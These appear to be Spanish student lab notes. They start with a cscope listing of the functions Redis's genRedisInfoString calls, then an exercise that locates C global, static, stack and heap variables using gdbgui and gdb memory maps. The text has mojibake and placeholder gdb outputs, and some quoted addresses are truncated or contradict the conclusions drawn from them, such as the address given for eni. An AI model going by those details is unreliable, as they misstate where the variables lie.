src/server.c getInstantaneousMetric 6311 "instantaneous_ops_per_sec:%lld\r\n", getInstantaneousMetric(STATS_METRIC_COMMAND),
src/server.c getInstantaneousMetric 6316 "instantaneous_input_kbps:%.2f\r\n", (float )getInstantaneousMetric(STATS_METRIC_NET_INPUT)/1024,
src/server.c getInstantaneousMetric 6317 "instantaneous_output_kbps:%.2f\r\n", (float )getInstantaneousMetric(STATS_METRIC_NET_OUTPUT)/1024,
src/server.c getInstantaneousMetric 6318 "instantaneous_input_repl_kbps:%.2f\r\n", (float )getInstantaneousMetric(STATS_METRIC_NET_INPUT_REPLICATION)/1024,
src/server.c getInstantaneousMetric 6319 "instantaneous_output_repl_kbps:%.2f\r\n", (float )getInstantaneousMetric(STATS_METRIC_NET_OUTPUT_REPLICATION)/1024,
src/server.c kvstoreSize 6336 "pubsub_channels:%llu\r\n", kvstoreSize(server.pubsub_channels),
src/server.c dictSize 6337 "pubsub_patterns:%lu\r\n", dictSize(server.pubsub_patterns),
src/server.c kvstoreSize 6338 "pubsubshard_channels:%llu\r\n", kvstoreSize(server.pubsubshard_channels),
src/server.c dictSize 6341 "migrate_cached_sockets:%ld\r\n", dictSize(server.migrate_cached_sockets),
src/server.c getSlaveKeyWithExpireCount 6342 "slave_expires_tracked_keys:%zu\r\n", getSlaveKeyWithExpireCount(),
src/server.c trackingGetTotalKeys 6349 "tracking_total_keys:%lld\r\n", (unsigned long long ) trackingGetTotalKeys(),
src/server.c trackingGetTotalItems 6350 "tracking_total_items:%lld\r\n", (unsigned long long ) trackingGetTotalItems(),
src/server.c trackingGetTotalPrefixes 6351 "tracking_total_prefixes:%lld\r\n", (unsigned long long ) trackingGetTotalPrefixes(),
src/server.c getInstantaneousMetric 6368 "instantaneous_eventloop_cycles_per_sec:%llu\r\n", getInstantaneousMetric(STATS_METRIC_EL_CYCLE),
src/server.c getInstantaneousMetric 6369 "instantaneous_eventloop_duration_usec:%llu\r\n", getInstantaneousMetric(STATS_METRIC_EL_DURATION)));
src/server.c genRedisInfoStringACLStats 6370 info = genRedisInfoStringACLStats(info);
src/server.c sdscatprintf 6372 info = sdscatprintf(info, "cluster_incompatible_ops:%lld\r\n", server.stat_cluster_incompatible_ops);
src/server.c dictFind 6377 if (all_sections || (dictFind(section_dict,"replication") != NULL)) {
src/server.c sdscat 6378 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6379 info = sdscatprintf(info,
src/server.c sdscatprintf 6397 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6397 info = sdscatprintf(info, FMTARGS(
src/server.c sdscatprintf 6414 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6414 info = sdscatprintf(info, FMTARGS(
src/server.c sdscatprintf 6423 info = sdscatprintf(info,
src/server.c sdscatprintf 6428 info = sdscatprintf(info,
src/server.c sdscatprintf 6433 info = sdscatprintf(info, "total_disconnect_time_sec:%jd\r\n", (intmax_t)server.repl_total_disconnect_time+(current_disconnect_time));
src/server.c sdscatprintf 6435 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6435 info = sdscatprintf(info, FMTARGS(
src/server.c sdscatprintf 6441 info = sdscatprintf(info,
src/server.c replicationLogicalReplicaCount 6443 replicationLogicalReplicaCount());
src/server.c sdscatprintf 6449 info = sdscatprintf(info,
src/server.c listLength 6454 if (listLength(server.slaves)) {
src/server.c listRewind 6459 listRewind(server.slaves,&li);
src/server.c listNext 6460 while ((ln = listNext(&li))) {
src/server.c listNodeValue 6461 client *slave = listNodeValue(ln);
src/server.c replicationCheckHasMainChannel 6471 if (replicationCheckHasMainChannel(slave))
src/server.c connAddrPeerName 6479 if (connAddrPeerName(slave->conn,ip,sizeof(ip),&port) == -1)
src/server.c replstateToString 6483 const char *state = replstateToString(slave->replstate);
src/server.c time 6486 lag = time(NULL) - slave->repl_ack_time;
src/server.c sdscatprintf 6488 info = sdscatprintf(info,
src/server.c sdscatprintf 6496 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6496 info = sdscatprintf(info, FMTARGS(
src/server.c getFailoverStateString 6497 "master_failover_state:%s\r\n", getFailoverStateString(),
src/server.c dictFind 6509 if (all_sections || (dictFind(section_dict,"cpu") != NULL)) {
src/server.c sdscat 6510 if (sections++) info = sdscat(info,"\r\n");
src/server.c getrusage 6513 getrusage(RUSAGE_SELF, &self_ru);
src/server.c getrusage 6514 getrusage(RUSAGE_CHILDREN, &c_ru);
src/server.c sdscatprintf 6515 info = sdscatprintf(info,
src/server.c getrusage 6527 getrusage(RUSAGE_THREAD, &m_ru);
src/server.c sdscatprintf 6528 info = sdscatprintf(info,
src/server.c dictFind 6537 if (all_sections || (dictFind(section_dict,"module_list") != NULL) || (dictFind(section_dict,"modules") != NULL)) {
src/server.c sdscat 6538 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6539 info = sdscatprintf(info,"# Modules\r\n");
src/server.c genModulesInfoString 6540 info = genModulesInfoString(info);
src/server.c dictFind 6544 if (all_sections || (dictFind(section_dict,"commandstats") != NULL)) {
src/server.c sdscat 6545 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6546 info = sdscatprintf(info, "# Commandstats\r\n");
src/server.c genRedisInfoStringCommandStats 6547 info = genRedisInfoStringCommandStats(info, server.commands);
src/server.c dictFind 6551 if (all_sections || (dictFind(section_dict,"errorstats") != NULL)) {
src/server.c sdscat 6552 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscat 6553 info = sdscat(info, "# Errorstats\r\n");
src/server.c raxStart 6555 raxStart(&ri,server.errors);
src/server.c raxSeek 6556 raxSeek(&ri,"^",NULL,0);
src/server.c raxNext 6558 while (raxNext(&ri)) {
src/server.c sdscatprintf 6561 info = sdscatprintf(info,
src/server.c getSafeInfoString 6563 (int )ri.key_len, getSafeInfoString((char *) ri.key, ri.key_len, &tmpsafe), e->count);
src/server.c zfree 6564 if (tmpsafe != NULL) zfree(tmpsafe);
src/server.c raxStop 6566 raxStop(&ri);
src/server.c dictFind 6570 if (all_sections || (dictFind(section_dict,"latencystats") != NULL)) {
src/server.c sdscat 6571 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6572 info = sdscatprintf(info, "# Latencystats\r\n");
src/server.c genRedisInfoStringLatencyStats 6574 info = genRedisInfoStringLatencyStats(info, server.commands);
src/server.c dictFind 6579 if (all_sections || (dictFind(section_dict,"cluster") != NULL)) {
src/server.c sdscat 6580 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6581 info = sdscatprintf(info,
src/server.c dictFind 6588 if (all_sections || (dictFind(section_dict,"keyspace") != NULL)) {
src/server.c sdscat 6589 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6590 info = sdscatprintf(info, "# Keyspace\r\n");
src/server.c kvstoreSize 6594 keys = kvstoreSize(server.db[j].keys);
src/server.c kvstoreSize 6595 vkeys = kvstoreSize(server.db[j].expires);
src/server.c estoreSize 6596 subexpiry = estoreSize(server.db[j].subexpires);
src/server.c sdscatprintf 6599 info = sdscatprintf(info,
src/server.c dictFind 6607 if (all_sections || (dictFind(section_dict,"keysizes") != NULL)) {
src/server.c sdscat 6608 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6609 info = sdscatprintf(info, "# Keysizes\r\n");
src/server.c serverAssert 6618 serverAssert(sizeof(typestr)/sizeof(typestr[0]) == OBJ_TYPE_BASIC_MAX);
src/server.c kvstoreSize 6631 if (kvstoreSize(server.db[dbnum].keys) == 0)
src/server.c kvstoreGetMetadata 6635 int64_t *kvstoreHist = kvstoreGetMetadata(server.db[dbnum].keys)->keysizes_hist[type];
src/server.c snprintf 6640 buflen += snprintf(buf + buflen, sizeof(buf) - buflen, "db%d_%s:", dbnum, typestr[type]);
src/server.c snprintf 6646 int res = snprintf(buf + buflen, sizeof(buf) - buflen,
src/server.c sdscatprintf 6655 if (cnt) info = sdscatprintf(info, "%s\r\n", buf);
src/server.c dictFind 6665 if (everything || dictFind(section_dict, "modules") != NULL || sections < (int )dictSize(section_dict) ||
src/server.c dictSize 6665 if (everything || dictFind(section_dict, "modules") != NULL || sections < (int )dictSize(section_dict) ||
src/server.c dictSize 6666 (all_sections && dictSize(section_dict)))
src/server.c modulesCollectInfo 6669 info = modulesCollectInfo(info,
src/server.c dictFind 6670 everything || dictFind(section_dict, "modules") != NULL ? NULL: section_dict,
src/server.c dictFind 6675 if (dictFind(section_dict, "debug") != NULL) {
src/server.c sdscat 6676 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6677 info = sdscatprintf(info, "# Debug\r\n" FMTARGS(
src/server.c FMTARGS 6677 info = sdscatprintf(info, "# Debug\r\n" FMTARGS(
```


### Cscope en Modo interactivo
```
cscope -d 
```
En el men√∫ de cscope, escogemos la opci√≥n: 2 ‚Äì Find functions called by this function:

![genRedisInfoString-3.png](capturas/genRedisInfoString-3.png)

Escribimos la funci√≥n que nos pide el ejercicio: genRedisInfoString:  
![genRedisInfoString-3.png](capturas/genRedisInfoString-4.png)  
donde:
- Hay 188 resultados en total pero s√≥lo muestra las l√≠neas 1-9.
- Quedan 180 m√°s por ver.
- Para ver los siguientes resultados: Pulsamos la barra espaciadora.

------------------------------------


# Ejercicio 5 - An√°lisis de las variables de un programa
Vamos a analizar las variables de un programa y donde se van a ubicar en memoria.

Respecto del siguiente programa, indicad de que tipo son cada una de las variables, en que zona o segmento de la memoria se ubicar√° y que valor por defecto poseer√° al inicio del programa.
```
#include <stdio.h>
#include <stdlib.h>
 
int gni;
int gi = 99;
 
void f() {
    static int eni;
    static int ei = 99;
 
    printf("Dir: %p Val: %i\n", &eni, eni);
    printf("Dir: %p Val: %i\n", &ei, ei);
}
 
int main() {
    f();
    int *pae = malloc(sizeof(int));
    printf("Dir: %p Val: %i\n", pae, *pae);
 
    *pae = 100;
    printf("Dir: %p Val: %i\n", pae, *pae);
 
    gni = 9;
    printf("Dir: %p Val: %i\n", &gni, gni);
    printf("Dir: %p Val: %i\n", &gi, gi);
 
    free(pae);
    return 0;
}
```

## Previo: Instalaci√≥n de gdbgui
Para comprobar d√≥nde se almacenan las variables del programa, vamos a instalar gdbgui. Gdbgui es una interfaz gr√°fica para el depurador gdb que se ejecuta en el navegador web. Es una forma m√°s amigable y visual de usar gdb para depurar, ver variables y examinar memoria.

**Instalamos gdbgui en un entorno virtual python en linux:**
```
# 1) Preparar
sudo apt install python3 python3-pip python3-venv gdb

# 2) Proyecto python + Entorno virtual venv
mkdir ~/gdbgui_project
cd ~/gdbgui_project
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install gdbgui

# 3) Ejecutar
gdbgui
```

**Compilamos con s√≠mbolos el programa del ejercicio:**
```
gcc -g -O0 ejercicio5.c -o ejercicio5
```

**Cargamos el binario en gdbgui:**  
Normalmente en el navegador, accedemos a http://127.0.0.1:5000 y abrimos el binario compilado para ir viendo las variables.
```
./ejercicio5
```
![gdbgui-3.png](capturas/gdbgui-3.png)

![gdbgui-2.png](capturas/gdbgui-2.png)

![gdbgui-4.png](capturas/gdbgui-4.png)


**A√±adimos breakpoints clave en gdbgui:**  
- En la funci√≥n f().
- En main() en la l√≠nea: int *pae = malloc(sizeof(int));
- En main() en la l√≠nea: *pae = 100;
- En main() en la l√≠nea: gni = 9;


**Vemos algunos de los segmentos/secciones del ejecutable:**  
![gdbgui-6.png](capturas/gdbgui-6.png)

Escribimos en la consola integrada de gdbgui:
```
(gdb) info files
Symbols from "/home/xxniwexx/gdbgui/ejercicio5".
Local exec file:
        `/home/xxniwexx/gdbgui/ejercicio5', file type elf64-x86-64.
        Entry point: 0x1070
        ......
        0x0000000000001070 - 0x0000000000001270 is .text
        ......
        0x0000000000004018 - 0x0000000000004030 is .data
        0x0000000000004030 - 0x0000000000004040 is .bss
```

**Mostramos m√°s detalles por secci√≥n:**
``` 
(gdb) maintenance info sections
Exec file: `/home/xxniwexx/gdbgui/ejercicio5', 
        file type elf64-x86-64.
 .....
 [13]     0x00001070->0x00001270 at 0x00001070: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
 .....
 [24]     0x00004018->0x00004030 at 0x00003018: .data ALLOC LOAD DATA HAS_CONTENTS
 [25]     0x00004030->0x00004040 at 0x00003030: .bss ALLOC
 .....
(gdb) 
```

**Vemos el mapa de memoria del proceso:**  
Con esto podremos indentificar en qu√© segmento/regi√≥n cae una direcci√≥n concreta, como por ejemplo, la de una variable local:
```
(gdb) info proc mappings
process 53004
Mapped address spaces:

Start Addr         End Addr           Size               Offset             Perms File 
0x0000555555554000 0x0000555555555000 0x1000             0x0                r--p  /home/xxniwexx/gdbgui/ejercicio5 
0x0000555555555000 0x0000555555556000 0x1000             0x1000             r-xp  /home/xxniwexx/gdbgui/ejercicio5 
0x0000555555556000 0x0000555555557000 0x1000             0x2000             r--p  /home/xxniwexx/gdbgui/ejercicio5 
0x0000555555557000 0x0000555555558000 0x1000             0x2000             r--p  /home/xxniwexx/gdbgui/ejercicio5 
0x0000555555558000 0x0000555555559000 0x1000             0x3000             rw-p  /home/xxniwexx/gdbgui/ejercicio5 
0x0000555555559000 0x000055555557a000 0x21000            0x0                rw-p  [heap] 
0x00007ffff7da9000 0x00007ffff7dac000 0x3000             0x0                rw-p   
0x00007ffff7dac000 0x00007ffff7dd4000 0x28000            0x0                r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7dd4000 0x00007ffff7f39000 0x165000           0x28000            r-xp  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7f39000 0x00007ffff7f8f000 0x56000            0x18d000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7f8f000 0x00007ffff7f93000 0x4000             0x1e2000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7f93000 0x00007ffff7f95000 0x2000             0x1e6000           rw-p  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7f95000 0x00007ffff7fa2000 0xd000             0x0                rw-p   
0x00007ffff7fbd000 0x00007ffff7fbf000 0x2000             0x0                rw-p   
0x00007ffff7fbf000 0x00007ffff7fc3000 0x4000             0x0                r--p  [vvar] 
0x00007ffff7fc3000 0x00007ffff7fc5000 0x2000             0x0                r--p  [vvar_vclock] 
0x00007ffff7fc5000 0x00007ffff7fc7000 0x2000             0x0                r-xp  [vdso] 
0x00007ffff7fc7000 0x00007ffff7fc8000 0x1000             0x0                r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffff7fc8000 0x00007ffff7ff0000 0x28000            0x1000             r-xp  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffff7ff0000 0x00007ffff7ffb000 0xb000             0x29000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffff7ffb000 0x00007ffff7ffd000 0x2000             0x34000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffff7ffd000 0x00007ffff7ffe000 0x1000             0x36000            rw-p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffff7ffe000 0x00007ffff7fff000 0x1000             0x0                rw-p   
0x00007ffffffdd000 0x00007ffffffff000 0x22000            0x0                rw-p  [stack] 
(gdb) 
```


## An√°lisis de las variables del programa
Las variables del programa se reparten entre segmento de datos (inicializados y no inicializados), stack y heap, y sus valores por defecto dependen de si son est√°ticas/globales o autom√°ticas/din√°micas. 


### 1. `gni` (Global No Inicializada)
- **Tipo:** int. Entero con signo.
- **√Åmbito:** Global.
- **Duraci√≥n:** Est√°tica. Existe durante toda la ejecuci√≥n.
- **Ubicaci√≥n (Segmento):** BSS (Block Started by Symbol). Este segmento almacena las variables globales y est√°ticas que no tienen una inicializaci√≥n expl√≠cita en el c√≥digo.
- **Valor por defecto:** 0. El sistema operativo limpia este segmento (lo pone a ceros) antes de ejecutar el main ya que es una variable global de almacenamiento est√°tico sin inicializar.

![gni](capturas/gni.png)
donde:
- En el panel de expressions de gdbgui vemos la direcci√≥n de `gni`: `gni 0x5555555558034 int *` y `*gni 9 int`.
- En el panel de memory de gbbgui vemos: `0x5555555558034 ‚Üí bytes 09 00 00 00 ...` ‚Üí valor 9 en little-endian, que coincide con la asignaci√≥n `gni = 9;`.


**Revisamos d√≥nde cae esa direcci√≥n `0x5555555558034`:**  
Comparamos esta direcci√≥n con el resultado de `maintenance info sections`. As√≠ identificaremos si la variable est√° en .data, .bss, heap, stack, etc.
``` 
(gdb) maintenance info sections
Exec file: `/home/xxniwexx/gdbgui/ejercicio5', 
        file type elf64-x86-64.
 ......
 [24]     0x555555558018->0x555555558030 at 0x00003018: .data ALLOC LOAD DATA HAS_CONTENTS
 [25]     0x555555558030->0x555555558040 at 0x00003030: .bss ALLOC
 [26]     0x00000000->0x0000001e at 0x00003030: .comment READONLY HAS_CONTENTS
 ......
```
donde:
- Inicio de `.bss`: 0x55555555803
- Fin de `.bss`: 0x555555558040
- Direcci√≥n de `gni`: 0x555555555803
- Concluimos que la direcci√≥n de `gni` cae dentro del rango de la secci√≥n `.bss`, por lo tanto la variable `gni` est√° en `.bss`.



### 2. `gi` (Global Inicializada)
- **Tipo:** int. Entero con signo.
- **√Åmbito:** Global.
- **Duraci√≥n:** Est√°tica. Existe durante toda la ejecuci√≥n.
- **Ubicaci√≥n (Segmento):** Data Segment (Datos Inicializados). Este segmento es para variables globales o est√°ticas a las que se les ha dado un valor inicial (= 99).
- **Valor por defecto:** 99. El valor se copia desde el archivo ejecutable a la memoria al iniciar el programa.
- **Direcci√≥n de la variable `gi`:**
  ```
  (gdb) p &gi
  ??? = ?????????????
  ```
  Direcci√≥n de esta variable: `0x00000000000`.
- Por el mismo razonamiento anterior con las secciones:
  - Inicio de `.data`: `0x555555558018`.
  - Fin de `.data`: `0x555555558030`.
  - Concluimos que la direcci√≥n de `gi` cae dentro del rango de la secci√≥n `.data`, por lo tanto la variable `gi` est√° en `.data`.



### 3. `eni` (Est√°tica No Inicializada)
- **Tipo:** int. Entero con signo.
- **√Åmbito:** Local. De bloque. Solo visible dentro de `f`.
- **Duraci√≥n:** Est√°tica. No se destruye al salir de `f`. Aunque est√° declarada dentro de una funci√≥n (f), la palabra clave static le dice al compilador que la trate como una global en cuanto a su vida (dura todo el programa), pero con √°mbito local (solo visible en f). 
- **Ubicaci√≥n (Segmento):** BSS. Al no tener valor, va al BSS.
- **Valor por defecto:** 0, por ser est√°tica sin inicializar expl√≠citamente.
- **Direcci√≥n de la variable `eni`:**
  ```
  (gdb) p &eni
  ??? = ?????????????
  ```
  Direcci√≥n de esta variable: `0x555555555038`.
- Por el mismo razonamiento anterior con las secciones:
  - Inicio de `.bss`: `0x55555555803`.
  - Fin de `.bss`: `0x555555558040`.
  - Concluimos que la direcci√≥n de `eni` cae dentro del rango de la secci√≥n `.bss`, por lo tanto la variable `eni` est√° en `.bss`.


### 4. `ei` (Est√°tica Inicializada)
- **Tipo:** int. Entero con signo.
- **√Åmbito:** Local. De bloque. Solo visible dentro de `f`.
- **Duraci√≥n:** Est√°tica. No se destruye al salir de `f`. Aunque est√° declarada dentro de una funci√≥n (f), la palabra clave static le dice al compilador que la trate como una global en cuanto a su vida (dura todo el programa), pero con √°mbito local (solo visible en f). 
- **Ubicaci√≥n (Segmento):** Data Segment. Al ser static y tener un valor asignado (= 99), se guarda junto con las globales inicializadas.
- **Valor por defecto:** 99, valor de inicializaci√≥n expl√≠cito.‚Äã

![gdbgui-5.png](capturas/gdbgui-5.png)

**Direcci√≥n de la variable `ei`:**  
```
(gdb) p &ei
$2 = (int *) 0x55555555802c <ei>
```
donde:
- `ei` se encuentra en la direcci√≥n: `0x55555555802c`.


**Revisamos d√≥nde cae esa direcci√≥n `0x55555555802c`:**  
Comparamos esta direcci√≥n con el resultado de `maintenance info sections`. As√≠ identificaremos si la variable est√° en .data, .bss, heap, stack, etc.
``` 
(gdb) maintenance info sections
Exec file: `/home/xxniwexx/gdbgui/ejercicio5', 
        file type elf64-x86-64.
 ......
 [24]     0x555555558018->0x555555558030 at 0x00003018: .data ALLOC LOAD DATA HAS_CONTENTS
 [25]     0x555555558030->0x555555558040 at 0x00003030: .bss ALLOC
 [26]     0x00000000->0x0000001e at 0x00003030: .comment READONLY HAS_CONTENTS
 ......
```
donde:
- Inicio de `.data`: `0x555555558018`.
- Fin de `.data`: `0x555555558030`.
- Direcci√≥n `de ei`: `0x55555555802c`.
- Concluimos que la direcci√≥n de `ei` cae dentro del rango de la secci√≥n `.data`, por lo tanto la variable `ei` est√° en `.data`.



### 5. `pae` (El puntero en s√≠) y `*pae` (El contenido apuntado / Memoria Din√°mica)
**`pae:`**
- **Tipo:** int *. Puntero a entero.
- **√Åmbito:** De bloque. Solo visible dentro de main.
- **Duraci√≥n:** Autom√°tica. Es una variable local autom√°tica declarada dentro de main sin static. Solo dura mientras main se ejecuta.
- **Ubicaci√≥n (Segmento):** Stack (Pila). 
- **Valor por defecto:** Valor inicial: el valor devuelto por la instrucci√≥n `malloc(sizeof(int))` que en cuanto se ejecute esa intrucci√≥n ser√°, una direcci√≥n del heap. Si pae se declara sin inicializar, entonces contendr√° un valor indeterminado, que es basura del stack, hasta que se le asigne algo.


**`*pae`:**
- **Tipo:** int. Es un bloque de memoria para un entero (int). El entero al que apunta.
- **√Åmbito:** No tiene nombre en el c√≥digo, se accede v√≠a el puntero. *pae = ‚Äúel contenido de la direcci√≥n almacenada en pae‚Äù. Solo podemos llegar a √©l a trav√©s del puntero. En verdad, **NO es una variable, es un objeto din√°mico** al que apunta `pae`.
- **Duraci√≥n:** Din√°mica, mientras no se haga free(pae).
- **Ubicaci√≥n (Segmento):** Heap (Mont√≥n). La funci√≥n malloc(sizeof(int)) solicita espacio en esta zona de memoria din√°mica. pae (en el Stack) guarda la direcci√≥n de este bloque (en el Heap).
- **Valor por defecto:** Indeterminado (Basura). `malloc` reserva memoria pero no la inicializa, por lo que el contenido es basura hasta que se le asigne en la instrucci√≥n ‚ûû ‚ûû ‚ûû *pae = 100;.


**Estamos en el breakpoint de la l√≠nea 17, justo antes de ejecutar la llamada a malloc:**  
![puntero-pae](capturas/puntero-pae-pk.png)
donde:
- `pae` es una variable local autom√°tica de tipo int * que vive en el stack de main. En este punto GDB resuelve `pae = 0x7fffffffdbf0` (valor del puntero), que es basura porque a√∫n no se ha ejecutado `pae = malloc(sizeof(int));`.
- En el panel de memory, los bytes `01 00 00 00 00 00 00 00` son simplemente la ‚Äúbasura‚Äù que hay en esa zona del stack antes de inicializar `pae` con el resultado de `malloc`.

**Recordando los operadores:**
- `&x` devuelve la direcci√≥n de la variable `x`.
- `*p` accede al valor al que apunta el puntero `p`.

**En nuestro caso:**
- `pae`
  - Es la variable puntero.
  - Vive en el stack.
  - Su valor es ‚Äúuna direcci√≥n‚Äù (actualmente basura).

- `&pae`
  - Es la direcci√≥n de la variable `pae`.
  - Tipo: `int *`.
  - En GDB vemos:
    ```
    (gdb) p &pae
    $3 = (int **) 0x7fffffffdb58
    ```
    Es el hueco del stack donde se guarda el puntero pae (zona `0x7fffffff`‚Ä¶ ‚Üí stack).

- `*pae`
  - Es el entero al que apunta pae.
  - En este breakpoint concreto pae no apunta a nada v√°lido, as√≠ que hacer *pae o &*pae tiene un comportamiento indefinido.

- `&*pae`
  - En general, para un puntero v√°lido, es la direcci√≥n del entero al que apunta pae y se cumple `&*pae == pae`.
  - Aqu√≠ GDB imprime:
    ```
    (gdb) p &*pae
    $4 = (int *) 0x7fffffffdbf0
    ```
    Pero ese valor no tiene significado real en el programa, porque pae todav√≠a contiene basura.

**En este breakpoint concreto:**
- `pae` ‚âà 0x7fffffffdbf0 (basura),
- `&pae` = 0x7fffffffdb58 (direcci√≥n del puntero en el stack).


**Estamos en el breakpoint de la l√≠nea 18, justo despues de ejecutar la llamada a malloc:**
![puntero-pae-2.png](capturas/puntero-pae-2.png)
donde:
- `&pae = 0x7fffffffdb58`
  - Es la direcci√≥n de la variable pae.
  - Esa direcci√≥n cae en la zona 0x7fffffffdb58, que corresponde al stack.
  - Es ‚Äúel hueco de stack‚Äù donde se almacena el puntero pae.

- `&*pae = 0x5555555596b0`
  - El resultado de evaluar &*pae es 0x5555555596b0.
  - Por la identidad del lenguaje C, cuando pae es un puntero v√°lido, &*pae es exactamente el mismo valor que pae.
  - Es decir, 0x5555555596b0 es la direcci√≥n de memoria a la que apunta el puntero pae.
  - Esa direcci√≥n cae en la zona 0x5555555596b0, que en tu proceso corresponde al heap, donde est√° el int reservado con malloc.

- `pae 0x5555555596b0 int *`:
  - pae es la variable autom√°tica en el stack.
  - Su contenido actual es 0x5555555596b0, que es la direcci√≥n en el heap del objeto int que has reservado.
  - Se cumple la identidad (mientras pae sea un puntero v√°lido (no basura, no NULL)): `&*pae == pae`.


**Estamos en el breakpoint de la l√≠nea 21:**  
![puntero-pae-3.png](capturas/puntero-pae-3.png)
donde:
- `pae`:
  - Variable autom√°tica en stack.
  - Tipo `int *`.
  - Direcci√≥n de la variable: `&pae = 0x7fffffffdb58` (stack).
  - Valor actual: `pae = 0x5555555596b0` (direcci√≥n de heap).

- `*pae`:
  - Objeto `int` en el heap (memoria din√°mica).
  - Direcci√≥n: `&*pae = 0x5555555596b0` (igual que `pae`).
  - Valor actual: 100.
  - En el panel de memoria: bytes `64 00 00 00 ....` Ques es 100 en hexadecimal.



----------------------------------------------------------
## Tabla resumen de las variables
| Variable | Tipo    | √Åmbito / Clase          | Duraci√≥n   | Segmento de memoria | Valor por defecto al inicio del programa                |
| -------- | ------- | ----------------------- | ---------- | ------------------- | ------------------------------------------------------- |
| `init gni;`    | `int`   | Global, sin inicializar | Est√°tica   | `.bss`              | `0`                                                     |
| `init gi = 99;`     | `int`   | Global, inicializada    | Est√°tica   | `.data`             | `99`                                                    |
| `static init eni;`    | `int`   | Est√°tica local no inicializada. `static` local en `f()` | Est√°tica   | `.bss`              | `0`                                                     |
| `static init ei = 99;`     | `int`   |  Est√°tica local inicializada. `static` local en `f()` | Est√°tica   | `.data`             | `99`                                                    |
| `int *pae`    | `int *` | Local en `main`         | Variable local Autom√°tica | **Stack** (pila)    | Sin valor por defecto (pero se inicializa con `malloc`) |
| `*pae`   | `int`   | Dato apuntado por `pae` | Din√°mica. El int que reserva malloc   | **Heap**            | Indeterminado (basura tras `malloc`)                    |


### Esquema general de memoria para esas variables
```
   Direcciones bajas
   ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
   ‚îÇ       C√≥digo (.text)                                |
   |   c√≥digo de main, f, printf, etc.                   ‚îÇ
   ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
   ‚îÇ   Datos inicializados (.data)                       ‚îÇ
   ‚îÇ   - gi = 99    (global int = 99)                    ‚îÇ
   ‚îÇ   - ei = 99    (static int en f() = 99)             ‚îÇ
   ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ|
   ‚îÇ    Datos no inic. (.bss)                            ‚îÇ
   ‚îÇ   - gni = 9   (global int sin inicializar)          ‚îÇ
   ‚îÇ   - eni = 0   (static int en f() sin inicializar)   ‚îÇ
   ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
   ‚îÇ   Heap (mont√≠culo)                                  ‚îÇ 
   ‚îÇ   [ int ] = 100   ‚Üê (*pae)                          ‚îÇ 
